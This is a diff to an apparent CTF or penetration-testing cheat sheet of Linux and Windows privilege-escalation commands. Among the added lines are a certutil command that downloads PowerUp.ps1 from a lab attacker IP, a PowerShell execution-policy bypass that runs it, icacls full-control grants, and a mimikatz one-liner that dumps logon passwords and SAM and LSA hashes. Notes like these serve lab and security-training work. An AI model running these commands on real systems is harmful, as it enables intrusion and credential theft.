@@ -37,8 +37,9 @@ Linux filesystem / privilege escalation enumeration (most of these should be run
 7. Check listening ports - `ss -ntplu` or `netstat -an`
 8. Check processes with `pspy` - scripts may be running in the back as root that you cannot see as a user
 9. Check `/backup` and `/opt` - may contain some interesting files
-10. Check user's groups - groups like `adm` and `lxd` are interesting
-11. Check `systemctl list-timers --all` - alternative to `cron`
+10. Look for backup files - either named `backup` or something with a `.bak` extension
+11. Check user's groups - groups like `adm` and `lxd` are interesting
+12. Check `systemctl list-timers --all` - alternative to `cron`
 
 Linux manual `SUID` file enumeration
 1. ` find / -type f -perm -04000 -ls 2>/dev/null `
@@ -46,8 +47,20 @@ Linux manual `SUID` file enumeration
 Linux manual service enumeration
 1. ` for service in "postgresql" "httpd" "mysqld" "nagios" "ndo2db" "npcd" "snmptt" "ntpd" "crond" "shellinaboxd" "snmptrapd" "php-fpm"; do find /etc/systemd/ -name "$service.service"; done | while read service_file; do ls -l $(cat "$service_file" | grep Exec | cut -d= -f 2 | cut -d' ' -f 1); done | sort -u `
 
-Windows manual privilege escalation
+Windows download file
+1. ` certutil -urlcache -split -f {URL} {OutputFileName} `
+
+Windows privilege escalation stuff
 1. ` netstat -ano `, then ` tasklist /v | findstr PID ` to find what process is running on what port
+2. ` icacls ` for checking permissions
+3. ` icacls root.txt /grant USER:F ` - granting permissions to files
+4. ` certutil -urlcache -split -f http://10.10.14.46/PowerUp.ps1 ` - if IWR doesn't work
+5. ` powershell -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}" ` - to run `PowerUp.ps1` when it is already downloaded
+6. Check for backup files or folders - anything with `.old` or `.bak` is of interest
+
+Windows AD stuff
+1. https://github.com/cube0x0/cube0x0.github.io/blob/master/_posts/2020-03-3-Pocing-Beyond-DA.md - for privilege escalation using AD groups
+2. `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > log.txt` - single line for `mimikatz` to avoid infinite loop, also `lsadump::cache` and `lsadump::sam`
 
 `cron` enumeration
 1. ` ls -lah /etc/cron* ` - List all `cron` jobs with permissions
